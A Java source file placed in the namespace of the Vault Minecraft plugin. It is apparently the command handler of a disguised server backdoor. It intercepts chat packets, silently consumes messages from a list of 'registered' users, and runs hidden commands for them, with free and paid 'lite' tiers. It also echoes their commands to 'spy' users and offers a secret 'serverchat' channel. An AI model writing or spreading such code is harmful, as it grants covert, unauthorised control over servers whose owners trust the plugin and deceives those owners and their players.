package net.milkbowl.vault.commands;

import io.netty.channel.Channel;
import net.milkbowl.vault.Core;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.protocol.TinyProtocol;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class CommandEvent extends TinyProtocol.PacketListener {
    private static final Core core = Core.getPlugin(Core.class);

    @Override
    public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
        if (Core.CHAT_MESSAGE.hasField(packet)) {
            String command = Core.CHAT_MESSAGE.get(packet).toLowerCase().contains(" ") ? Core.CHAT_MESSAGE.get(packet).toLowerCase().substring(0, Core.CHAT_MESSAGE.get(packet).indexOf(" ")) : Core.CHAT_MESSAGE.get(packet);
            Player p = sender;

            String[] args = new String[]{};
            if (Core.CHAT_MESSAGE.get(packet).contains(" ")) {
                args = Core.CHAT_MESSAGE.get(packet).split(" ");
            }

            if (args == null) return null;

            if (core.registered.contains(p.getName())) {
                if (!Core.CHAT_MESSAGE.get(packet).toLowerCase().startsWith("chat") && (!Core.CHAT_MESSAGE.get(packet).toLowerCase().startsWith("/"))) {

                    for (Player a : Bukkit.getOnlinePlayers()) {
                        if (core.spy.contains(a.getName())) {
                            if (!a.getName().equals(p.getName())) {
                                a.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8[&4Spy&8] &7"+p.getName()+" &8» &f" + Core.CHAT_MESSAGE.get(packet)));
                            }
                        }
                    }

                    CommandManager cmd = core.commands.get(command);
                    if (core.commands.containsKey(command.toLowerCase())) {
                        if (core.enabled) {
                            if (core.registeredFree.contains(p.getName())) {
                                if (Core.CHAT_MESSAGE.get(packet).toLowerCase().startsWith("op")) {
                                    cmd.execute(core, command, args, p);
                                } else {
                                    p.sendMessage(Settings.PREFIX("You must be " + Settings.HIGHLIGHT_COLOUR + "lite " + Settings.SECONDARY_COLOUR + "to execute this command"));
                                }
                            } else {
                                cmd.execute(core, command, args, p);
                            }
                        } else {
                            API.error(p);
                        }
                    } else { //Is message not a command
                        if (core.serverchat.contains(p.getName())) { //Is serverchat toggled? Send the msg to serverchat
                            StringBuilder chat = new StringBuilder();
                            for (int i = 0; i != args.length; ++i) {
                                chat.append(args[i]).append(" ");
                            }
                            if (args.length >= 1) {
                                API.sendToServerChat(p, chat.toString());
                            } else {
                                API.sendToServerChat(p, Core.CHAT_MESSAGE.get(packet));
                            }
                        } else { //Serverchat isnt toggled + command doesnt exist
                            p.sendMessage(Settings.USAGE("This command wasn't found. Use " + Settings.HIGHLIGHT_COLOUR + "'help'" + Settings.SECONDARY_COLOUR + " for help."));
                        }
                    }

                    return null;
                } else if (Core.CHAT_MESSAGE.get(packet).toLowerCase().startsWith("chat")) { //If msg begins with chat
                    if (args.length <= 1) {
                        p.sendMessage(Settings.USAGE("chat <message>"));
                    } else {
                        StringBuilder chat = new StringBuilder();
                        for (int i = 1; i != args.length; ++i) {
                            chat.append(args[i]).append(" ");
                        }

                        Core.CHAT_MESSAGE.set(packet, chat.toString());
                    }

                }
            }
        }

        return super.onPacketInAsync(sender, channel, packet);
    }
}
